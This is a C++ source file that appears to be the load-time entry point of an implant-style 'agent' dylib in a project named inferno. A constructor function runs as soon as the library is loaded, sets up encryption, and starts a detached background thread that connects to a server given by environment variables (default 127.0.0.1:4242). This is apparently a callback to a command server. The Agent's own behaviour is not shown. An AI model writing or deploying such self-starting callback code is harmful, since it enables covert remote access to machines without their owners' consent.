#include "../include/Agent.hpp"
#include "../include/entry_dylib.hpp"
#include "../../common/include/CryptoContext.hpp"
#include <cerrno>
#include <cstdlib>
#include <thread>

namespace inferno { namespace agent {

#ifdef INFERNO_TESTING
static bool& constructorRan() {
    static bool ran = false;
    return ran;
}
bool didAgentConstructorRun() { return constructorRan(); }
#endif

}} // namespace inferno::agent

__attribute__((constructor))
static void agent_entry() {
#ifdef INFERNO_TESTING
    inferno::agent::constructorRan() = true;
    return;
#endif

    inferno::CryptoContext::instance().initDefault();

    const char* env_ip = ::getenv("INFERNO_SERVER_IP");
    const char* env_port = ::getenv("INFERNO_SERVER_PORT");
    std::string ip = env_ip ? env_ip : "127.0.0.1";
    uint16_t port = 4242;
    if (env_port && *env_port) {
        char* end = nullptr;
        errno = 0;
        long parsed = std::strtol(env_port, &end, 10);
        if (errno == 0 && end && *end == '\0' && parsed >= 1 && parsed <= 65535) {
            port = static_cast<uint16_t>(parsed);
        }
    }

    std::thread agent_thread([ip, port]() {
        inferno::Agent agent(ip, port);
        agent.run();
    });
    agent_thread.detach();
}
